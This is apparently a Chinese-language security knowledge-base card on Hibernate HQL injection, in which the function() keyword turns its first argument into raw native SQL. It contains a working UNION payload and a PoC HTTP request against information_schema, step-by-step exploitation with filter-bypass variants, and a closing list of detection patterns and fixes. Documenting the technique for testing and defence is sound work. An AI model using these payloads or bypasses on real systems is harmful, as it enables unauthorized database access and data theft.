---
id: web-generic-sqli-hibernate-hql-function-keyword-escape
title: Hibernate HQL `function()` 关键字逃逸：第一参数被当函数名拼接，5.x/6.x 通用地注入原生 SQL
type: scenario
domain: web
path: web/generic/sqli
technique: hibernate-hql-function-keyword-native-sql-injection
aliases:
- HQL function() 逃逸
- JPQL function 关键字注入
- Hibernate 函数名注入
- function keyword escape
tags:
- sqli
- java
- hibernate
- hql
- jpql
- orm
- union
- mysql
cve: []
severity: high
confidence: high
affected_versions: Hibernate 5.x / 6.x（原文称两代均可用）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V279
  verified_at: '2026-11-07T23:38:57+08:00'
  notes: 已对照原文核对：function('name',...) 第一参数作函数名后追加 ()，payload mysql'+and+function('1=2+union+select+table_name,table_schema+from+information_schema.tables%23')=' 与 img/33-35 的文档、生成 SQL（# 注释掉 () 与收尾引号）及 information_schema 回显一致；原文称 5.x/6.x 均可用，affected_versions 按原文表述。dup-scan 判与 sql()/backslash 卡 likely_duplicate，经原文裁决为不同机制（函数名拼接、5.x/6.x 通用 vs sql() 仅 6.x vs 反斜杠词法差分 5.6.15 之前），三卡保留不删。
---

## 一句话结论

HQL/JPQL 的 `function('name', ...)` 会把第一参数当函数名、翻译成 `name(...)` 拼进生成 SQL，且参数内容没有限制；在拼接注入点中写入 `and function('1=2 union select table_name,table_schema from information_schema.tables#')='`，即可让函数体成为原生 SQL 的 UNION 语句，`#` 再注释掉函数追加的 `()` 与收尾引号。该手法在 5.x 与 6.x 均可用，是比反斜杠差分和 `sql()` 更通用的 HQL 逃逸通道。

## 原理

- `function()` 是 JPQL/HQL 用来调用数据库函数的关键字：`function('version')` → `version()`，`function('updatexml',1,1,1)` → `updatexml(1,1,1)`。
- 翻译规则：第一个参数（字符串）被**直接当作函数名**，随后追加一对括号，其余参数放入括号内。Hibernate 不校验第一参数是否是合法标识符，也不做转义/白名单。
- 因此当注入的字符串内容为 `1=2 union select ...#` 时，翻译结果为 `1=2 union select ...#()`；MySQL 的 `#` 注释掉后面的 `()` 和 HQL 拼接补上的 `='1'`，前面的 `1=2 union select ...` 就成为完整 SQL 片段。
- 版本差异只影响引号文本的复制方式：5.x 中 `function('aaaa''bbbb',...)` → `aaaa''bbbb(...)`，6.x → `aaaa'bbbb(...)`；本逃逸不依赖这对单引号，所以两代通用。
- 该函数在值表达式位置合法，因此 `and function('...')='` 能通过 HQL 语法解析，再在 SQL 层展开为 UNION。

## 触发条件

- 用户输入被字符串拼接进 `createQuery()` 的 HQL 字面量（如 `where x='"+param+"'`），未使用参数绑定。
- Hibernate 5.x 或 6.x（原文实测两代均可）；目标数据库注释符与 payload 匹配（MySQL 用 `#`，其他库需换成 `--` 等）。
- 注入值可出现在 WHERE 表达式位置，且 `function(...)` 的返回值能参与比较（`='` 收尾或注释掉）。
- UNION 列数与实体 SELECT 列表一致。
- 应用/WAF 未拦截 `function(`、`union select`、`information_schema` 等关键字组合。

## 利用步骤

1. 确认注入点：单引号闭合后用 `and 1=1` / `and 1=2` 观察布尔差分，并确认 HQL 语法未报错。
2. 构造：`mysql' and function('1=2 union select table_name,table_schema from information_schema.tables#')='`。
3. HQL 解析为合法函数调用；生成的 SQL 为 `... where table_schema='mysql' and 1=2 union select table_name,table_schema from information_schema.tables#()='1'`，`#` 截断后合法执行。
4. URL 编码发送（括号可保留，`#` → `%23`），原文实测返回 `information_schema` 下的表名列表。
5. 替换 UNION 后半段枚举库/表/列或读业务数据；若目标为其他数据库，把 `#` 换成对应注释符并调整函数/类型。
6. 若 `function` 关键字被过滤，可尝试大小写/注释拆分（仅 6.0.1+ 支持 `/**/`）、或改用 6.x 的 `sql()`；5.6.15 之前还可尝试反斜杠差分。

## PoC

原文环境最小请求（未在本机执行）：

```http
GET /VulDemo/SQLDemo5?name=mysql'+and+function('1=2+union+select+table_name,table_schema+from+information_schema.tables%23')=' HTTP/1.1
Host: 127.0.0.1:8080
```

Hibernate 翻译结果（MySQL）：

```sql
select u1_0.table_name, u1_0.table_schema from tables u1_0
where u1_0.table_schema='mysql' and 1=2
union select table_name,table_schema from information_schema.tables#()='1'
```

响应回显 `innodb_table_stats`、`CHARACTER_SETS`、`CHECK_CONSTRAINTS` 等记录，证明函数体已成为原生 SQL 并执行。

## 变体与关联

- 函数调用变体：`function('updatexml',1,1,1)` 等数据库函数可用于报错注入；`function('version')` 可直接回显版本。
- 版本关联：6.x 新增的 `sql()` 是同类原生 SQL 嵌入函数，但 5.x 不可用；`function()` 因 5.x/6.x 通用而更适合作为首选探测 payload。
- 关联：反斜杠差分逃逸（Hibernate 5.6.15 之前）是另一条老版本通道；基础 HQL 层面注入受映射表/字段限制，`function()` 逃逸后等同于原生 SQL 注入。

## 检测与防御

- 根因修复：HQL 参数全部使用 `:name`/`?` + `setParameter()`，禁止拼接；不接受用户输入作为函数名/函数体片段。
- 特性限制：如无业务需要，禁止在 HQL 中使用 `function()` 动态函数名；对必须使用的场景做固定函数名白名单。
- 检测：请求参数出现 `function(`、`sql(`、`union select`、`information_schema`、`#`/`%23`；Hibernate SQL 日志中出现 `1=2 union select ...#()` 形态；HQL 报错泄露生成语句。
- 审计：搜索 HQL 拼接点，重点检查看似「调用数据库函数」的参数是否可由前端控制；对 5.x/6.x 混合升级环境统一按通用逃逸面评估。
